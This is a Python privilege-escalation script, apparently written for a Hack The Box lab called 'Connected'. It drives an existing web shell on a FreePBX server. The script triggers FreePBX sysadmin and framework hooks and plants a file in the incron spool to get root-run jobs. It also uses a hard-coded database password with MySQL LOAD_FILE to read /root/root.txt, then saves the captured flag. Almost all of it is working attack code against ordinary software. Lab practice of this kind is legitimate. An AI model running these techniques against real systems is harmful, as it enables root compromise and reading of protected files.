#!/usr/bin/env python3
import pathlib, re, sys
sys.path.insert(0, "/home/kali/Desktop/htb/Connected/scripts")
from enum_privesc import get_shell
LOOT = pathlib.Path("/home/kali/Desktop/htb/Connected/loot")

def php_hook(module, hook, params_php="null"):
    return (
        'php -r \'include "/etc/freepbx.conf"; $f=FreePBX::create(); '
        f'$p={params_php}; var_export($f->Hooks->runModuleSystemHook("{module}","{hook}",$p));\'' + " 2>&1"
    )

def main():
    cmd, url = get_shell()
    lines = [f"shell: {url}\n"]
    print("[+]", url)
    params = (
        'array("fqdn"=>"connected.htb","le"=>"no","ucp"=>"81","acp"=>"80",'
        '"restapps"=>"83","restapi"=>"82","hpro"=>"84")'
    )
    tests = [
        ("id", "id"),
        ("framework logrotate", php_hook("framework", "logrotate")),
        ("logrotate file", "ls -la /etc/logrotate.d/freepbx-fw* 2>&1; cat /etc/logrotate.d/freepbx-fw* 2>&1"),
        ("dump-iptables", php_hook("sysadmin", "dump-iptables")),
        ("iptables out", "sleep 3; ls -la /tmp/iptables-save-output 2>&1; head -3 /tmp/iptables-save-output 2>&1"),
        ("touch incron dump", "rm -f /tmp/iptables-save-output /var/spool/asterisk/incron/sysadmin.dump-iptables; touch /var/spool/asterisk/incron/sysadmin.dump-iptables; sleep 6; ls -la /tmp/iptables-save-output 2>&1"),
        ("update-ports", php_hook("sysadmin", "update-ports", params)),
        ("portmgmt", "ls -la /usr/sbin/sysadmin_portmgmt 2>&1"),
        ("LOAD_FILE", "mysql -u freepbxuser -p'mZzDpAGKTmPJ' -h127.0.0.1 asterisk -N -e \"SELECT LOAD_FILE('/root/root.txt')\" 2>&1"),
        ("logrotate hook head", "head -60 /var/www/html/admin/modules/framework/hooks/logrotate 2>&1"),
        ("kvstore sysadmin", "mysql -u freepbxuser -p'mZzDpAGKTmPJ' -h127.0.0.1 asterisk -e \"SELECT \\`key\\`,LEFT(val,400) FROM kvstore_FreePBX_modules_Sysadmin\" 2>&1"),
        ("root.txt", "cat /root/root.txt 2>&1"),
    ]
    flag = None
    for title, c in tests:
        print("[*]", title)
        o = cmd(c, timeout=200)
        lines.append(f"=== {title} ===\n{o}\n")
        print(o[:4000])
        m = re.search(r"HTB\{[^}]+\}", o)
        if m:
            flag = m.group(0)
    LOOT.joinpath("incron-root-flag-run.log").write_text("\n".join(lines))
    if flag:
        for p in [LOOT/"root-flag.txt", LOOT/"copy-paste.txt", pathlib.Path("/home/kali/Desktop/htb/copy-paste.txt")]:
            p.write_text(flag + "\n")
        print("[+] FLAG saved", flag)
        return 0
    print("[-] no flag")
    return 1

if __name__ == "__main__":
    raise SystemExit(main())
